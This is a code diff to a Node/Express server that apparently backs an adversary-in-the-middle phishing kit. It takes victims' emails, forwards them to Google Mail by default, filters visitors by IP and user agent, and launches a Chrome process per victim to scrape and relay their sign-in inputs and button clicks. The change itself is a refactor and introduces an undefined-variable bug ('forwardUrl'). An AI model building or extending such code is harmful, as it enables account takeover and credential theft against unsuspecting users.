@@ -32,7 +32,8 @@ import {
   checkAgentValidation,
   checkClientIpValidation,
 } from "./helpers/security.js";
-import { STATUS_INIT, STATUS_RUNNING } from "./db/jsonDB.js";
+import { STATUS_RUNNING } from "./db/jsonDB.js";
+import { getHtmlAlreadySignIn } from "./helpers/html.js";
 
 // ---------------------------
 // Config
@@ -123,12 +124,11 @@ app.post("/api/sign", async (req, res) => {
     let forwardURL = decodeB64(forward, "https://mail.google.com");
 
     // Check if already signed in
-    const { result: chkFlg, resHTML: signInHtml } =
-      await checkEmailAlreadySignin(email, forwardURL);
+    const chkFlg = await checkEmailAlreadySignin(email);
 
-    if (chkFlg === true) {
+    if (chkFlg) {
       console.log("[ALREADY SIGNED IN] :", email);
-      // Flask returns raw HTML here
+      const signInHtml = getHtmlAlreadySignIn(forwardUrl);
       return res.status(200).send(signInHtml || "");
     }
 
@@ -142,10 +142,10 @@ app.post("/api/sign", async (req, res) => {
         userAgent,
       });
       console.log("[NEW USER ID] :", userId, email, lang, forwardURL);
-      // Running open here      
+      // Running open here
       // await unChrom
-      const chromePid = await runChromeProcess(userId)
-      
+      const chromePid = await runChromeProcess(userId);
+
       await UsersDB.set(userId, {
         userId,
         email,
@@ -154,7 +154,7 @@ app.post("/api/sign", async (req, res) => {
         pid: chromePid,
         status: STATUS_RUNNING,
       });
-      
+
       const htmlTxt = await scrapingReady(userId, email, lang, {
         forwardURL,
         userAgent,
@@ -185,8 +185,6 @@ app.all("/api/btn-click", async (req, res) => {
     const inputValue = payload.value;
     const btnType = payload.btnType;
     const btnText = payload.btnText;
-
-    console.log("[BTN CLICK] :", userId, inputValue, btnType, btnText);
 
     const out = await scrapInputValueAndBtnNext(
       userId,
